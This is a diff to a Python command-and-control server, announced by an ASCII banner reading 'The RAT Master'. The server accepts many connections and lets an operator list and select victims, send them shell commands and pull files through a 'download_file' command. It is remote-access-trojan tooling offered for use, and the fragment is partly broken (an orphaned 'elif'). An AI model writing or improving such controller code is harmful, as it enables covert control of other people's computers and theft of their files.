@@ -8,6 +8,15 @@ queue = Queue()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
 s.bind(("",8000))  
+print("""
+ _______ _    _ ______   _____         _______   __  __           _____ _______ ______ _____             ____               _ _                              _____             _           
+|__   __| |  | |  ____| |  __ \     /\|__   __| |  \/  |   /\    / ____|__   __|  ____|  __ \           |  _ \             | (_)                            |  __ \           (_)          
+   | |  | |__| | |__    | |__) |   /  \  | |    | \  / |  /  \  | (___    | |  | |__  | |__) |  ______  | |_) |_   _       | |_  __ _ _ __ ___   ___ _   _  | |  | | ___  _ __ _  ___  ___ 
+   | |  |  __  |  __|   |  _  /   / /\ \ | |    | |\/| | / /\ \  \___ \   | |  |  __| |  _  /  |______| |  _ <| | | |  _   | | |/ _` | '_ ` _ \ / _ \ | | | | |  | |/ _ \| '__| |/ _ \/ _ \
+   | |  | |  | | |____  | | \ \  / ____ \| |    | |  | |/ ____ \ ____) |  | |  | |____| | \ \           | |_) | |_| | | |__| | | (_| | | | | | |  __/ |_| | | |__| | (_) | |  | |  __/  __/
+   |_|  |_|  |_|______| |_|  \_\/_/    \_\_|    |_|  |_/_/    \_\_____/   |_|  |______|_|  \_\          |____/ \__, |  \____/|_|\__, |_| |_| |_|\___|\__, | |_____/ \___/|_|  | |\___|\___|
+                                                                                                                __/ |            __/ |                __/ |                  _/ |          
+                                                                                                               |___/            |___/                |___/                  |__/           """)
 def accepting_connections():    
     while True:
         try:
@@ -21,7 +30,8 @@ def accepting_connections():
             print("Error in accepting conncetions")
 def Greater_Console():
     print("[+] Succesfully established server, now running, for knowledge on commands, type help")  
-    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands" 
+    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands"
+    
     while True:
         cmd = input('Greater_Console> ')
         if cmd =='list':
@@ -60,6 +70,9 @@ def commands(conn):
     y = conn.recv(6000).decode("utf-8")
     while True: 
         print(y,end ="")
+        cmd = input() 
+        if cmd == "quit": #change this for multi
+            break
         elif len(cmd) > 0:
             if cmd == "download_file":
                 conn.send(cmd.encode("utf-8"))
@@ -103,6 +116,7 @@ def commands(conn):
             else:               
                 conn.send(cmd.encode("utf-8")) 
                 client_response = conn.recv(6000).decode("utf-8") 
+    
                 print(client_response)    
         else:
             print("Error")        
